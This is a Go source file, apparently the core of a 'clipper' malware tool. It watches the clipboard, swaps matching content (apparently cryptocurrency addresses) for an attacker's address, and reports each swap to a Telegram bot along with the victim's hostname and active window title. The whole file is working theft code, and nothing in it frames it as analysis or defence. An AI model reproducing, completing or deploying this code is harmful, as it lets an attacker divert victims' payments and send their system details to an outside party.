package clipper

import (
	"fmt"
	"os"
	"regexp"
	"time"

	"github.com/atotto/clipboard"

	"clipper/src/telegram"
	"clipper/src/utils"
)

type Matcher struct {
	Regex *regexp.Regexp
	Addr  string
}

// main clipper func
func StartClipper(chat_id string, bot_token string, matchers []Matcher) {
	go func() {
		var lastClipboardContent string
		hostname, _ := os.Hostname()

		for {
			time.Sleep(600 * time.Millisecond) // (1000 = 1s)

			currentContent, err := clipboard.ReadAll()
			if err != nil {
				continue
			}

			if currentContent == lastClipboardContent {
				continue
			}

			matched := false
			for _, matcher := range matchers {
				if matcher.Regex.MatchString(currentContent) {
					originalAddr := currentContent

					err = clipboard.WriteAll(matcher.Addr)
					if err != nil {
						continue
					}

					lastClipboardContent = originalAddr
					matched = true

					telegram.SendLog(
						fmt.Sprintf(
							"%s | %s\n\n%s → %s",
							utils.GetActiveWindow(),
							hostname,
							originalAddr,
							matcher.Addr,
						),
						chat_id,
						bot_token,
					)

					break
				}
			}

			if !matched {
				lastClipboardContent = currentContent
			}
		}
	}()
}